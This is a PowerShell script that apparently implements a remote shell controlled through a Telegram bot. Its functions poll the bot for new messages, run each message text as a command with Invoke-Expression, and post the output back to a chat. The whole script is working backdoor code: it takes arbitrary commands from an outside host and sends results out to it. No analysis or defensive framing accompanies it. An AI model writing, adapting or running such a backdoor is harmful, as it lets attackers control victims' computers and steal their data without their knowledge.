


function read-comm()
{
    Param
    (
       [Parameter(Mandatory=$true, Position=0)]
        $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $offset
   )
    $url="https://api.telegram.org/bot$apiToken/getUpdates?offset=$offset"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing
    $ProgressPreference = 'Continue'
    $test = $r | ConvertFrom-Json
    $message = $test.result.message[-1]
    $message = $message.text
    $offset = $test.result.update_id[-1]
    return $message, $offset
}



function Excmd
{

   param
   (
          [Parameter(Mandatory)]
      [string] $command
    )
   $ProgressPreference = 'SilentlyContinue' 
   $out = Invoke-Expression -Command $command | Out-String
   $ProgressPreference = 'Continue'
   return $out
}

function Send-data ($data,$apiToken,$chat_id)
{
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$data"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url
    $ProgressPreference = 'Continue'
    
}


function First-offset
{
    Param
    (
         [Parameter(Mandatory=$true, Position=0)]
         [string] $apiToken
    )

    $url = "https://api.telegram.org/bot$apiToken/getUpdates?offset="
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing | ConvertFrom-Json
    $ProgressPreference = 'Continue'
    $Foffset = $r.result.update_id
    $foo = $Foffset[-1]
    if ($foo.ToString().Length -gt 1)
    {
        return $foo
    }
    else
    {
        return $Foffset
    }

}


function start-myshell
{
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string] $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $chat_id
    )

    $foo=0
    $offset = First-offset $apiToken
    while ($true)
    {
        try
        {   
            
            $message = read-comm -apiToken $apiToken -offset $offset
            $offset = $message[1]
            if ($offset.contains(" "))
            {
                $offset = -split $offset
                $offset = $offset[-1]
            }

            
            if (-not($offset -eq $foo))
            {
                $foo=$offset
                $command = $message[0]
                $output = Excmd $command
                Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                
            }
            Start-Sleep -Seconds 0.3
        }    
        
        catch 
        {
            LogWrite($Error[0].Exception)
        }
        
    }

}
   

